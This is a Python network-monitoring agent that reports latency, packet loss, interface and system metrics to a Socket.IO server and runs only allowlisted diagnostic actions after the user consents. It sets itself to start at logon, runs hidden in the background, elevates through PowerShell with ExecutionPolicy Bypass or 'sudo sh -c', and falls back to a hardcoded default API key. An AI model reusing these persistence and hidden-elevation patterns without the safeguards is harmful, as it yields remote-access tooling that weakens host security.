#!/usr/bin/env python3
"""
Network Agent - Collects metrics and executes commands from server.
"""
import sys
import os
import time
import json
import socket
import platform
import subprocess
import logging
import random
import argparse
import ctypes
import tempfile
import tkinter as tk
import uuid
import queue
import threading
from tkinter import messagebox
from datetime import datetime, timezone

import socketio
import psutil

# ==================== PATH HANDLING ====================
def get_agent_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def get_data_dir():
    if sys.platform == 'win32':
        base = os.environ.get('APPDATA', os.path.expanduser('~'))
        data_dir = os.path.join(base, 'NetworkAgent')
    else:
        data_dir = os.path.expanduser('~/.network_agent')
    os.makedirs(data_dir, exist_ok=True)
    return data_dir

# ==================== LOGGING ====================
log_file = os.path.join(get_data_dir(), 'network_agent.log')
id_file = os.path.join(get_data_dir(), 'agent_id.txt')

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(log_file),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('agent')

# ==================== CONFIGURATION ====================
def resolve_api_key(env=None):
    env = os.environ if env is None else env
    for key_name in ('AGENT_API_KEY', 'API_KEY'):
        value = env.get(key_name)
        if value:
            return value
    return 'your-secret-key'


def load_config(config_path=None, env=None):
    env = os.environ if env is None else env
    config = {
        'server_url': env.get('SERVER_URL', 'http://localhost:5000'),
        'api_key': resolve_api_key(env),
        'collect_interval': int(env.get('COLLECT_INTERVAL', 10)),
        'timeout': int(env.get('TIMEOUT', 30)),
        'network_test_host': env.get('NETWORK_TEST_HOST', '8.8.8.8'),
    }
    config_file = config_path or os.path.join(get_data_dir(), 'config.json')
    if os.path.exists(config_file):
        try:
            with open(config_file, 'r') as f:
                file_config = json.load(f)
                config.update(file_config)
        except Exception as e:
            logger.warning(f"Failed to load config file {config_file}: {e}")
    return config

# ==================== COMMAND EXECUTION ====================
def build_windows_command_launcher(command, elevated=True):
    """Build a PowerShell launcher that runs a command elevated and waits for completion."""
    if not elevated:
        return f'cmd.exe /c "{command}"'

    escaped_command = command.replace("'", "''")
    return (
        "$ErrorActionPreference='Stop'; "
        f"Start-Process -FilePath 'cmd.exe' -Verb RunAs -ArgumentList '/c', '{escaped_command}' -Wait -WindowStyle Hidden"
    )


AGENT_ACTION_COMMANDS = {
    'flush_dns_cache': {
        'windows': 'ipconfig /flushdns',
        'linux': 'resolvectl flush-caches',
        'darwin': 'dscacheutil -flushcache',
    },
    'check_connectivity': {
        'windows': 'ping -n 4 1.1.1.1',
        'linux': 'ping -c 4 1.1.1.1',
        'darwin': 'ping -c 4 1.1.1.1',
    },
    'inspect_interface_counters': {
        'windows': 'netstat -e',
        'linux': 'ip -s link',
        'darwin': 'netstat -ib',
    },
}


def resolve_agent_action(action_id, parameters=None, os_name=None):
    """Resolve a server action ID to a locally allowlisted command."""
    if parameters is None:
        parameters = {}
    if not isinstance(parameters, dict) or parameters:
        raise ValueError('Action parameters are not supported')

    os_name = (os_name or platform.system()).strip().lower()
    os_key = {'windows': 'windows', 'linux': 'linux', 'darwin': 'darwin'}.get(os_name)
    if not os_key:
        raise ValueError(f'Unsupported operating system: {os_name or "unknown"}')

    command = AGENT_ACTION_COMMANDS.get(action_id, {}).get(os_key)
    if not command:
        raise ValueError(f'Unknown or unsupported action: {action_id}')
    return command

# ==================== AUTO-START ====================
def install_autostart():
    if sys.platform == 'win32':
        import winreg
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                exe_path = sys.executable
                script_path = os.path.abspath(__file__)
                winreg.SetValueEx(
                    regkey,
                    "NetworkAgent",
                    0,
                    winreg.REG_SZ,
                    f'"{exe_path}" "{script_path}" --daemon'
                )
            return True
        except Exception as e:
            logger.error(f"Failed to install autostart registry value: {e}")
            return False
    elif sys.platform == 'darwin':
        plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.networkagent</string>
    <key>ProgramArguments</key>
    <array>
        <string>{sys.executable}</string>
        <string>--daemon</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
        plist_path = os.path.expanduser('~/Library/LaunchAgents/com.networkagent.plist')
        with open(plist_path, 'w') as f:
            f.write(plist_content)
        subprocess.run(['launchctl', 'load', plist_path])
        return True
    else:
        service_content = f'''[Unit]
Description=Network Agent
After=network.target

[Service]
ExecStart={sys.executable} {os.path.abspath(__file__)} --daemon
Restart=always
User={os.environ.get('USER', '')}

[Install]
WantedBy=multi-user.target'''
        service_path = os.path.expanduser('~/.config/systemd/user/network-agent.service')
        os.makedirs(os.path.dirname(service_path), exist_ok=True)
        with open(service_path, 'w') as f:
            f.write(service_content)
        subprocess.run(['systemctl', '--user', 'daemon-reload'])
        subprocess.run(['systemctl', '--user', 'enable', 'network-agent'])
        return True

def run_as_daemon():
    if sys.platform == 'win32':
        import subprocess
        if not sys.executable.endswith('pythonw.exe'):
            pythonw = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            if os.path.exists(pythonw):
                subprocess.Popen([pythonw, __file__, '--daemon'], 
                            creationflags=subprocess.CREATE_NO_WINDOW)
                sys.exit(0)
    else:
        import os
        if os.fork():
            sys.exit(0)
        os.setsid()
        if os.fork():
            sys.exit(0)

# ==================== AGENT CLASS ====================
class NetworkAgent:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.sio = socketio.Client()
        self.agent_id = self._get_or_create_agent_id()
        self._interface_counters = None
        self._interface_sampled_at = None
        self.running = True
        self.command_queue = queue.Queue()
        self.queued_command_ids = set()
        self.command_queue_lock = threading.Lock()
        self.command_worker = threading.Thread(target=self._process_command_queue, daemon=True)
        self.command_worker.start()
        self.register_handlers()

    def _get_or_create_agent_id(self):
        if os.path.exists(id_file):
            with open(id_file, 'r') as f:
                return f.read().strip()
        new_id = f"agent-{platform.node()}-{random.randint(1000,9999)}"
        with open(id_file, 'w') as f:
            f.write(new_id)
        return new_id

    def run_command_with_elevation(self, command):
        """Run a healing command with elevation on Windows and wait for completion."""
        if platform.system() == 'Windows':
            try:
                launcher = build_windows_command_launcher(command, elevated=True)
                result = subprocess.run(
                    ['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', launcher],
                    capture_output=True,
                    text=True,
                    timeout=240,
                )
                output = (result.stdout or '') + (result.stderr or '')
                if result.returncode == 0:
                    return True, output.strip() or 'Command completed successfully.'
                return False, output.strip() or f'Command exited with code {result.returncode}'
            except subprocess.TimeoutExpired:
                return False, 'Command timed out while waiting for elevation.'
            except Exception as e:
                logger.error(f"Elevation failed: {e}", exc_info=True)
                return False, f"Elevation failed: {e}"
        else:
            try:
                result = subprocess.run(
                    ['sudo', 'sh', '-c', command],
                    capture_output=True, text=True, timeout=30
                )
                output = result.stdout + result.stderr
                success = result.returncode == 0
                return success, output
            except Exception as e:
                logger.error(f"Elevated command failed: {e}", exc_info=True)
                return False, str(e)

    def ask_user_permission(self, command):
        prompt_text = (
            f"Network Agent wants to execute the following command:\n\n{command}\n\n"
            "Do you allow this action?"
        )
        try:
            # Prefer a native Windows message box (works from background threads)
            if sys.platform == 'win32':
                try:
                    MB_YESNO = 0x00000004
                    MB_ICONQUESTION = 0x00000020
                    result = ctypes.windll.user32.MessageBoxW(None, prompt_text, "Network Agent Command Consent",
                                                               MB_YESNO | MB_ICONQUESTION)
                    # IDYES == 6
                    allowed = (result == 6)
                    logger.info(f"Native MessageBox consent result: {allowed}")
                    return allowed
                except Exception as e:
                    logger.warning(f"Native MessageBox failed: {e}")

            # Fallback to console if running interactively
            if hasattr(sys, 'stdin') and sys.stdin.isatty():
                answer = input(prompt_text + "\nAllow? [y/N]: ").strip().lower()
                result = answer in {'y', 'yes'}
                logger.info(f"Console consent result: {result}")
                return result

            # Last resort: try tkinter (may fail on headless or non-main threads)
            try:
                root = tk.Tk()
                root.withdraw()
                answer = messagebox.askyesno("Network Agent Command Consent", prompt_text)
                root.destroy()
                logger.info(f"User consent result: {answer}")
                return bool(answer)
            except Exception as e:
                logger.warning(f"GUI prompt failed: {e}")

            logger.warning("No interactive method available for consent; denying by default.")
            return False
        except Exception as e:
            logger.warning(f"Unexpected error while asking for consent: {e}. Denying command for safety.")
            return False

    def _process_command_queue(self):
        """Process server commands sequentially so each gets its own consent prompt."""
        while self.running:
            try:
                data = self.command_queue.get(timeout=1)
            except queue.Empty:
                continue

            command_id = data.get('command_id')
            issue_id = data.get('issue_id')
            try:
                if not command_id:
                    logger.warning("Ignoring malformed command payload: %s", data)
                    continue

                if 'command' in data:
                    raise ValueError('Command strings are not accepted; send an approved action ID')
                command = resolve_agent_action(
                    data.get('action_id'),
                    data.get('parameters'),
                    platform.system(),
                )

                if not self.ask_user_permission(command):
                    self.sio.emit('command_result', {
                        'command_id': command_id,
                        'issue_id': issue_id,
                        'action_id': data.get('action_id'),
                        'success': False,
                        'error': 'User denied permission',
                        'executed_at': datetime.now().isoformat()
                    }, namespace='/agent')
                    continue

                success, message = self.run_command_with_elevation(command)
                self.sio.emit('command_result', {
                    'command_id': command_id,
                    'issue_id': issue_id,
                    'action_id': data.get('action_id'),
                    'success': success,
                    'message': message,
                    'executed_at': datetime.now().isoformat()
                }, namespace='/agent')
            except Exception as exc:
                logger.exception("Command processing failed for %s", command_id)
                try:
                    self.sio.emit('command_result', {
                        'command_id': command_id,
                        'issue_id': issue_id,
                        'action_id': data.get('action_id'),
                        'success': False,
                        'error': str(exc),
                        'executed_at': datetime.now().isoformat()
                    }, namespace='/agent')
                except Exception:
                    pass
            finally:
                with self.command_queue_lock:
                    self.queued_command_ids.discard(command_id)
                self.command_queue.task_done()

    def register_handlers(self):
        @self.sio.on('connect', namespace='/agent')
        def on_connect():
            logger.info(f"Connected to server with SID: {self.sio.sid}")
            logger.info(f"Sending agent_register event with agent_id: {self.agent_id}")
            self.sio.emit('agent_register', {
                'agent_id': self.agent_id,
                'api_key': self.config['api_key'],
                'hostname': platform.node(),
                'os': platform.system(),
                'os_version': platform.version(),
                'ip': self._get_local_ip()
            },namespace='/agent')
            logger.info("Sent agent_register event")

        @self.sio.on('disconnect', namespace='/agent')
        def on_disconnect():
            logger.warning("Disconnected from server")

        @self.sio.on('run_command', namespace='/agent')
        def on_run_command(data):
            command_id = data.get('command_id')
            if not command_id:
                logger.warning("Received malformed command payload: %s", data)
                return
            with self.command_queue_lock:
                if command_id in self.queued_command_ids:
                    logger.warning("Ignoring duplicate command %s", command_id)
                    return
                self.queued_command_ids.add(command_id)
            self.command_queue.put(data)
            logger.info(
                "Queued action %s (id: %s, queue depth: %s)",
                data.get('action_id'), command_id, self.command_queue.qsize()
            )

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def collect_metrics(self):
        metrics = {
            'agent_id': self.agent_id,
            'timestamp': datetime.now(timezone.utc).isoformat(),
            'hostname': platform.node(),
        }
        probe_target = self.config['network_test_host']
        latency, loss = self._ping_stats(probe_target, count=10)
        metrics['latency_ms'] = latency
        metrics['packet_loss_pct'] = loss
        metrics['bandwidth_mbps'] = self._get_bandwidth()
        metrics['metric_targets'] = {
            'latency_ms': f'icmp:{probe_target}',
            'packet_loss_pct': f'icmp:{probe_target}',
            'bandwidth_mbps': f'device:{self.agent_id}',
            'dns_ok': 'dns:google.com',
            'connection_ok': 'tcp:1.1.1.1:443',
        }
        metrics['interface_metrics'] = self._get_interface_metrics()
        known_utilization = [
            interface['utilization_pct']
            for interface in metrics['interface_metrics']
            if interface.get('utilization_pct') is not None
        ]
        metrics['max_interface_utilization_pct'] = max(known_utilization, default=None)
        metrics['dns_ok'] = self._check_dns('google.com')
        metrics['connection_ok'] = self._check_connection('1.1.1.1', 443, timeout=2)
        metrics['cpu_percent'] = psutil.cpu_percent(interval=1)
        metrics['memory_percent'] = psutil.virtual_memory().percent
        return metrics

    def _get_interface_metrics(self):
        """Calculate per-interface throughput and utilization since last sample."""
        now = time.monotonic()
        counters = psutil.net_io_counters(pernic=True) or {}
        stats = psutil.net_if_stats()
        previous = self._interface_counters
        elapsed = now - self._interface_sampled_at if self._interface_sampled_at is not None else 0
        current = {
            name: {'bytes_sent': counter.bytes_sent, 'bytes_recv': counter.bytes_recv}
            for name, counter in counters.items()
        }
        self._interface_counters = current
        self._interface_sampled_at = now
        if not previous or elapsed <= 0:
            return []

        interfaces = []
        for name, current_counters in current.items():
            interface = stats.get(name)
            old_counters = previous.get(name)
            if not interface or not interface.isup or not old_counters:
                continue
            if name.lower() in {'lo', 'lo0'} or interface.speed <= 0:
                continue

            received_mbps = max(0, current_counters['bytes_recv'] - old_counters['bytes_recv']) * 8 / elapsed / 1_000_000
            sent_mbps = max(0, current_counters['bytes_sent'] - old_counters['bytes_sent']) * 8 / elapsed / 1_000_000
            utilization_pct = max(received_mbps, sent_mbps) / interface.speed * 100
            interfaces.append({
                'name': name,
                'speed_mbps': interface.speed,
                'rx_mbps': round(received_mbps, 3),
                'tx_mbps': round(sent_mbps, 3),
                'utilization_pct': round(min(utilization_pct, 100), 2),
            })
        return interfaces

    def _ping_stats(self, host, count=4):
      try:
         if platform.system() == 'Windows':
            cmd = ['ping', '-n', str(count), host]
         else:
            cmd = ['ping', '-c', str(count), host]
        
         output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, text=True)
         loss = 0.0
         avg_latency = 0.0
        
         import re
        
         for line in output.splitlines():
            # Parse packet loss
            if 'loss' in line.lower():
                match = re.search(r'(\d+)%', line)
                if match:
                    loss = float(match.group(1))
            
            # Parse average latency – handle both "avg" and "Average"
            if 'avg' in line.lower() or 'average' in line.lower():
                # Extract numbers (float or int)
                nums = re.findall(r'\d+\.?\d*', line)
                if nums:
                    # Usually the last number is the average
                    avg_latency = float(nums[-1])
        
         return avg_latency, loss
      except Exception as e:
        logger.error(f"Ping error: {e}")
        return 9999, 100.0

    def _get_bandwidth(self):
        try:
            net1 = psutil.net_io_counters()
            time.sleep(1)
            net2 = psutil.net_io_counters()
            total_bytes = (net2.bytes_sent - net1.bytes_sent) + (net2.bytes_recv - net1.bytes_recv)
            return round((total_bytes * 8) / 1000000, 2)
        except:
            return 0.0

    def _check_dns(self, domain):
        try:
            socket.gethostbyname(domain)
            return True
        except:
            return False

    def _check_connection(self, host, port, timeout=2):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, port))
            s.close()
            return True
        except:
            return False

    def start(self):
      while True:
        try:
            self.sio.connect(
                self.config['server_url'],
                transports=['websocket', 'polling'],
                namespaces=['/agent']
            )
            break
        except Exception as e:
            logger.error(f"Failed to connect: {e}")
            logger.info("Retrying in 5 seconds...")
            time.sleep(5)

      while self.running:
        try:
            metrics = self.collect_metrics()
            self.sio.emit('agent_metrics', metrics, namespace='/agent')
            logger.info(f"Sent metrics: {metrics['latency_ms']}ms latency, {metrics['packet_loss_pct']}% loss")
        except Exception as e:
            logger.error(f"Error: {e}")
            # Try to reconnect if disconnected
            if not self.sio.connected:
                logger.warning("Disconnected from server, reconnecting...")
                try:
                    self.sio.connect(
                        self.config['server_url'],
                        transports=['websocket', 'polling'],
                        namespaces=['/agent']
                    )
                except:
                    pass
        time.sleep(self.config['collect_interval'])
# ==================== MAIN ====================
def parse_args():
    parser = argparse.ArgumentParser(description='Network Agent')
    parser.add_argument('--daemon', action='store_true', help='Run as daemon')
    parser.add_argument('--install', action='store_true', help='Install and add to startup')
    parser.add_argument('--uninstall', action='store_true', help='Uninstall')
    parser.add_argument('--config', help='Config file path')
    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()
    
    if args.install:
        print("Installing Network Agent...")
        if install_autostart():
            print("Installed successfully.")
        else:
            print("Installation failed. Check permissions and log file.")
        args.daemon = True
    
    if args.uninstall:
        print("Uninstalling Network Agent...")
        if sys.platform == 'win32':
            import winreg
            try:
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.DeleteValue(regkey, "NetworkAgent")
            except Exception as e:
                logger.warning(f"Uninstall cleanup failed: {e}")
        print("Uninstalled.")
        sys.exit(0)
    
    config_path = None
    if args.config:
        config_path = os.path.abspath(args.config)
    config = load_config(config_path)
    
    if args.daemon:
        run_as_daemon()
    
    agent = NetworkAgent(config=config)
    try:
        agent.start()
    except KeyboardInterrupt:
        logger.info("Stopped")
        sys.exit(0)
